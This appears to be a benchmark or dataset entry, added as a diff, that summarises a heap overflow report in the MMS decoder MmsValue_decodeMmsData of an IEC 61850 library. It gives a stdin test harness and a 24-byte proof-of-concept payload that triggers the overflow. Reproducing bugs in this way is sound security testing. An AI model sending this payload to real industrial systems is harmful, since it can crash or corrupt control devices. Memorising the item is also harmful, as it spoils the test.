@@ -1,0 +1,13 @@
+Number: 194
+
+Summarize:
+The report states that `MmsValue_decodeMmsData` has a heap overflow vulnerability in `mms/iso_mms/server/mms_access_result.c`. The vulnerable path is exercised by passing crafted input data to `MmsValue_decodeMmsData(globalbuf, 0, (int)readcount, 0)`. The supplied proof of concept is a specific byte sequence read from standard input, and the demonstrated impact is a heap overflow during decoding.
+
+Reproduce:
+1. Use the provided test program: it declares `uint8_t globalbuf[0x10000]`, reads input from stdin with `read(0, globalbuf, sizeof(globalbuf))`, and if data was read, calls `MmsValue_decodeMmsData(globalbuf, 0, (int)readcount, 0)`.
+2. Run that program with the following PoC bytes as stdin input:
+`<a2><16><a2><00><86><12><00><00><00><00><00><00><00><00><00><00><00><00><00><00><00><00><00><00>`
+3. The report states this triggers a heap overflow in `MmsValue_decodeMmsData`.
+
+Payload:
+a2 16 a2 00 86 12 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
